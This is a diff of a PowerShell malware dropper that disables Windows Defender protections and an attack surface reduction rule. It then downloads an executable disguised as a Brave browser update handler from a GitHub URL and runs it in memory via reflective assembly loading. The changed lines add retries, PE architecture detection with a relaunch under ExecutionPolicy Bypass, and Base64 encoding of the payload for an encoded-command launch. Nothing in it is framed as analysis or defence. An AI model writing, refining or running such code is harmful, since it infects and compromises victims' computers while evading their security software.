@@ -122,24 +122,64 @@ Set-MpPreference -DisableIOAVProtection $true -EA 0
 Set-MpPreference -AttackSurfaceReductionRules_Ids "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" -AttackSurfaceReductionRules_Actions Disabled -EA 0
 
 # ------------------------------------------------------------
-# PREPARE PAYLOAD AS ENCODED COMMAND
+# PREPARE PAYLOAD AS ENCODED COMMAND (auto‑architecture fix)
 # ------------------------------------------------------------
 $payloadScript = @'
 try {
-    $u='https://raw.githubusercontent.com/billa9889/wekk/main/Brave%20Update%20Handler.exe'
-    $maxRetries=3
-    for($i=1;$i -le $maxRetries;$i++){
+    $url = 'https://raw.githubusercontent.com/billa9889/wekk/main/Brave%20Update%20Handler.exe'
+    $maxRetries = 3
+    $bytes = $null
+
+    # Download with retries
+    for ($i = 1; $i -le $maxRetries; $i++) {
         try {
-            $bytes=(New-Object Net.WebClient).DownloadData($u)
+            Write-Host "WAIT..." -ForegroundColor Cyan
+            $bytes = (New-Object Net.WebClient).DownloadData($url)
             break
         } catch {
-            if($i -eq $maxRetries){exit}
+            if ($i -eq $maxRetries) { throw "Failed after $maxRetries attempts." }
             Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
         }
     }
-    [System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,(,[string[]]@()))
-} catch { exit }
+
+    if (-not $bytes -or $bytes.Length -eq 0) { throw "FAILED..." }
+
+    # -------- PE header architecture detection --------
+    $e_lfanew = [BitConverter]::ToInt32($bytes, 0x3C)
+    $machine = [BitConverter]::ToUInt16($bytes, $e_lfanew + 4)
+    $is32bit = $machine -eq 0x014c
+    $is64bit = $machine -eq 0x8664
+
+    $currentIs64 = [Environment]::Is64BitProcess
+    $needRelaunch = $false
+
+    if ($is32bit -and $currentIs64) {
+        $needRelaunch = $true
+        $newExe = "$env:windir\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
+    } elseif ($is64bit -and -not $currentIs64) {
+        $needRelaunch = $true
+        $newExe = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
+    }
+
+    if ($needRelaunch) {
+        $cmd = "-WindowStyle Normal -NoProfile -ExecutionPolicy Bypass -EncodedCommand $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($MyInvocation.MyCommand.ScriptContents)))"
+        Start-Process -FilePath $newExe -ArgumentList $cmd -WindowStyle Normal
+        exit 0
+    }
+
+    # -------- Load and invoke the assembly --------
+    $assembly = [System.Reflection.Assembly]::Load($bytes)
+    $entryPoint = $assembly.EntryPoint
+    if ($entryPoint -eq $null) { throw "Assembly has no EntryPoint (maybe a DLL)." }
+
+    $entryPoint.Invoke($null, (, [string[]] @()))
+} catch {
+    # No temp files – just exit with an error code
+    exit 1
+}
 '@
+
+# Encode the payload as UTF‑16LE Base64
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($payloadScript)
 $encoded = [Convert]::ToBase64String($bytes)
 
